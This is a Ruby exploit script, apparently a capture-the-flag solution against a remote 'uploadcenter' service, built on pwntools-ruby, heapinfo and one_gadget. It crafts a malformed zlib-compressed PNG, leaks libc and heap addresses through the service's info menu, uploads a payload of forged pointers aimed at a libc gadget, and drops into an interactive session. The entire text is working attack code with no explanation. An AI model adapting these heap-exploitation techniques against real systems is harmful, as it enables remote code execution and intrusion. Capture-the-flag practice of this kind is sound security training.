#!/usr/bin/env ruby
# encoding: ascii-8bit
require_relative '../../zocket/zocket'
require 'pry'
require 'pwn'      # https://github.com/peter50216/pwntools-ruby
require 'heapinfo' # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')

host, port = '202.120.7.216', 12345
@local = false
(host = '127.0.0.1'; @local = true) if ARGV.empty?
$z = Zocket.new host, port #, logger: HexLogger.new
def z;$z;end
$h = heapinfo('uploadcenter')
def h;$h.reload!;end
#================= Exploit Start ====================

require 'zlib'

context.arch='amd64'
def compress(str)
  Zlib::Deflate.deflate(str)
end

def gen_png(w, h)
  "\x89PNG\x0d\x0a\x1a\x0a" + "\x00\x00\x00\x0dIHDR" + p32(w).reverse + p32(h).reverse +
    "\x08\x06\x00\x00\x00" + "\x8b\xab\xd5\x63" + 
    p32(0x800).reverse + "IDAT" + flat(0,-1,0,0)*0x40 + p32(0) +
    p32(0) + "IEND" + p32(0)
end

def pt;z.gets "6 :) Monitor File\n"; end
def info(name)
  pt
  z.puts 1
  z.write name
  z.gets "ember"
  z.puts 1
  z.gets name
  str = z.gets ' , ',do_log: false
  str[0..-4]
end

def upload(data)
  pt
  z.puts 2
  fail if data.size > 0x100000
  z.write p32(data.size)
  z.write data, do_log: false
end

def commit
  pt
  z.puts 5
end

pt
z.puts 6

a = info('A'*17) # leak libc
libc = u64("\x00"+a + "\x00\x00")+0x1e00900
h.offset(libc,:libc)

data = compress(gen_png(64*10, 64*100).ljust(0x3e8000+0x800000, "\x00"))
upload(data)

pt
z.puts 4
z.puts 0

# gets
heap = info('B' * 16).ljust(8,"\x00").u64 - 0x1b0 # leak heap
h.offset(heap)

len = 0x3e8000+0x800000
png = gen_png(len, 1).ljust(0x1000-16,"A")
zero = 0x60e880
payload = png + flat(zero, heap, heap, heap+0x2d0, zero, heap, heap, libc+0xbaccc)* ((len-png.size) / 32 / 2) 

data = compress(payload)
upload(data)

z.interact
